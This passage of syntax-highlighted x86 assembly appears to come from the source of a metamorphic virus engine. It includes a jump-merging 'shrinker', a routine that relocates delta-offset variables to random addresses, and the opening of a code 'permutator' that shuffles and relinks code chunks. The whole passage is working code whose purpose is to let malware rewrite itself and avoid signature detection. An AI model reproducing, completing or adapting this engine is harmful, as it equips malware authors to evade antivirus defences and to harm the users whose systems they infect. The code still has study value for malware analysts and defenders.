                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NoOption</span><span class="sc0">
       </span><span class="sc1">;; Check merge with JNZ</span><span class="sc0">
       </span><span class="sc5">@@Check5_x</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">    </span><span class="sc1">; JNZ + JA?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SetNE</span><span class="sc0">     </span><span class="sc1">;   Then, set JNZ</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">    </span><span class="sc1">; JNZ + JBE?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UnconditionalJump</span><span class="sc0"> </span><span class="sc1">; Then, set JMP (unconditional)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NoOption</span><span class="sc0">  </span><span class="sc1">; If there isn't any of these options, it</span><span class="sc0">
                                  </span><span class="sc1">; can't be compressed</span><span class="sc0">
       </span><span class="sc1">;; Check merge with JB</span><span class="sc0">
       </span><span class="sc5">@@Check2_x</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; If 2nd &lt; 4, it can't be compressed</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@NoOption</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">    </span><span class="sc1">; If 2nd &gt; 7, it can't be compressed</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@NoOption</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; JB + JNZ/JA = JNZ</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@SetNE</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetBE</span><span class="sc0">     </span><span class="sc1">; JB + JZ/JBE = JBE</span><span class="sc0">

       </span><span class="sc1">;; Check merge with JAE</span><span class="sc0">
       </span><span class="sc5">@@Check3_x</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; JAE + JZ = JAE</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SetNB</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">    </span><span class="sc1">; JAE + JA = JAE</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SetNB</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">    </span><span class="sc1">; JAE + JBE = JMP</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UnconditionalJump</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NoOption</span><span class="sc0">  </span><span class="sc1">; Others can't be compressed</span><span class="sc0">

       </span><span class="sc1">;; Check merge with JZ</span><span class="sc0">
       </span><span class="sc5">@@Check4_x</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">    </span><span class="sc1">; JZ + JBE = JBE</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SetBE</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">    </span><span class="sc1">; JZ + JA = JAE/JNB</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NoOption</span><span class="sc0">
              </span><span class="sc1">;  jmp   @@SetNB</span><span class="sc0">

       </span><span class="sc5">@@SetNB</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">    </span><span class="sc1">; Set JAE</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
       </span><span class="sc5">@@SetNE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">    </span><span class="sc1">; Set JNZ</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
       </span><span class="sc5">@@SetBE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">    </span><span class="sc1">; Set JBE</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
       </span><span class="sc5">@@NoOption</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">; Set "no compression"</span><span class="sc0">
       </span><span class="sc5">@@ReturnCurrent</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
       </span><span class="sc5">@@UnconditionalJump</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">79h</span><span class="sc0">  </span><span class="sc1">; Set JMP</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetRealCheck</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; End of shrinker</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;; KEYWORD: Key_!VarIdent</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;; ********************************************************************** ;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The variable identificator</span><span class="sc0">
</span><span class="sc1">;; --------------------------</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; Little function that substitutes all the variables referenced along the</span><span class="sc0">
</span><span class="sc1">;; code by pointers to a table. These pointers will allow later the</span><span class="sc0">
</span><span class="sc1">;; repositioning of all the variables that are used by the whole code. It's</span><span class="sc0">
</span><span class="sc1">;; much like the label tables for displacement instructions, but this time</span><span class="sc0">
</span><span class="sc1">;; for variable referencing.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The variables are identified by using the function from the shrinker</span><span class="sc0">
</span><span class="sc1">;; CheckIfInstructionUsesMem() (which returns EAX true or false) and when</span><span class="sc0">
</span><span class="sc1">;; the variable only has DeltaRegister as the index.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">


</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; ECX = Delta offset register (must be known)</span><span class="sc0">
</span><span class="sc1">;; [VariableTable] = Address of buffer to store variables</span><span class="sc0">
</span><span class="sc1">;; [NumberOfVariables] = Place to store the number of variables</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc5">IdentifyVariables</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VariableTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfVariables</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Initialization</span><span class="sc0">

        </span><span class="sc5">@@LoopGetVar</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Get the instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Check if it's LEA</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">    </span><span class="sc1">; If it is, don't take it in account</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NextInstruction</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckIfInstructionUsesMem</span><span class="sc0"> </span><span class="sc1">; Get the usage of Mem by</span><span class="sc0">
                                                  </span><span class="sc1">; this instruction.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; EAX = 0?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NextInstruction</span><span class="sc0">       </span><span class="sc1">; Then, it doesn't</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Get first index</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">              </span><span class="sc1">; Delta register?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DeltaOffsetAt1</span><span class="sc0">        </span><span class="sc1">; If it's, jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Get the second index</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">              </span><span class="sc1">; Delta register?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DeltaOffsetAt2</span><span class="sc0">        </span><span class="sc1">; If it's, jump</span><span class="sc0">
        </span><span class="sc5">@@NextInstruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">              </span><span class="sc1">; Next instruction</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Last instr.?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopGetVar</span><span class="sc0">                          </span><span class="sc1">; If not, jump</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SelectNewVariables</span><span class="sc0">   </span><span class="sc1">; Jump to regarble the variables.</span><span class="sc0">
        </span><span class="sc5">@@DeltaOffsetAt1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Get the index where the Delta</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Continue_01</span><span class="sc0">          </span><span class="sc1">; register wasn't</span><span class="sc0">
        </span><span class="sc5">@@DeltaOffsetAt2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">@@Continue_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">               </span><span class="sc1">; Is it another index?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">      </span><span class="sc1">; If it is, don't change it.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get addition.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VariableTable</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get the variable table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfVariables</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the counter of</span><span class="sc0">
                                                     </span><span class="sc1">;  variables.</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DATA_SECTION</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the offset inside the</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFF8h</span><span class="sc0">          </span><span class="sc1">; data_section</span><span class="sc0">
        </span><span class="sc5">@@LookForVariable</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">           </span><span class="sc1">; If we haven't found the variable</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InsertVariable</span><span class="sc0">     </span><span class="sc1">; already inserted, insert it</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Check if it exists</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@VariableExists</span><span class="sc0">     </span><span class="sc1">; If exists, jump</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">; Check next variable</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LookForVariable</span><span class="sc0">
       </span><span class="sc5">@@InsertVariable</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; Insert the variable in the table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; and use EDX as the new variable</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfVariables</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; entry</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfVariables</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc5">@@VariableExists</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000809h</span><span class="sc0">  </span><span class="sc1">; Set the index 9, which means</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;  "variable identifier".</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; Variable address at table</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">

       </span><span class="sc5">@@SelectNewVariables</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20000h</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; Initialize the table of marks</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VarMarksTable</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; for variables. This helps</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; us to select new variables.</span><span class="sc0">
       </span><span class="sc5">@@LoopInitializeMarks</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Initialize with 0s all the table</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopInitializeMarks</span><span class="sc0">

</span><span class="sc1">;; Now what we are going to do is to get all the variables from the variable</span><span class="sc0">
</span><span class="sc1">;; table and select a new offset inside the DATA_SECTION for every one. In</span><span class="sc0">
</span><span class="sc1">;; this way the variables never point to the same place nor have a proportion</span><span class="sc0">
</span><span class="sc1">;; between them.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfVariables</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the table in EBX,</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VariableTable</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ECX = number of entries</span><span class="sc0">
           </span><span class="sc5">@@LoopGetNewVar</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">           </span><span class="sc1">; Select a new position</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01FFF8h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VarMarksTable</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the mark of the var.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Is that address already reserved?</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopGetNewVar</span><span class="sc0">    </span><span class="sc1">; If it is, select another one</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; Reserve that variable to avoid the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">; reselection of the offset</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VarMarksTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">              </span><span class="sc1">; Get the offset inside DATA_SECTION</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">           </span><span class="sc1">; Add a random from 0 to 3</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set the new address of the variable</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; Next variable</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; Have we reached the end?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopGetNewVar</span><span class="sc0"> </span><span class="sc1">; If not, loop again</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">                   </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">IdentifyVariables</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; End of variable identificator</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;; KEYWORD: Key_!Permutator</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;; ********************************************************************** ;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The permutator</span><span class="sc0">
</span><span class="sc1">;;---------------</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The code here will divide in chunks of code all the disassembled made</span><span class="sc0">
</span><span class="sc1">;; before, and then linked with jumps. All the labels are also fixed, so</span><span class="sc0">
</span><span class="sc1">;; the returned permutation could be reassembled without problems.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; First, the table is generated, then shuffled and after that used to copy</span><span class="sc0">
</span><span class="sc1">;; the instructions in the order the table says. The table will be generated</span><span class="sc0">
</span><span class="sc1">;; taking the first instruction address as the beginning of the frame</span><span class="sc0">
</span><span class="sc1">;; generator, and then creating pairs of "beginnings" and "ends" of portions,</span><span class="sc0">
</span><span class="sc1">;; for example: x000-x020h, x020h-x070h, x070h-x140h, etc.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; We keep in every shuffle loop the situation of the first chunk of code,</span><span class="sc0">
</span><span class="sc1">;; since it's the entrypoint. Moreover, when making the portions we scan for</span><span class="sc0">
</span><span class="sc1">;; some specific instructions that it's better to not fragment (for example,</span><span class="sc0">
</span><span class="sc1">;; CALL [API_Address] and APICALL_STORE).</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc5">PermutateCode</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
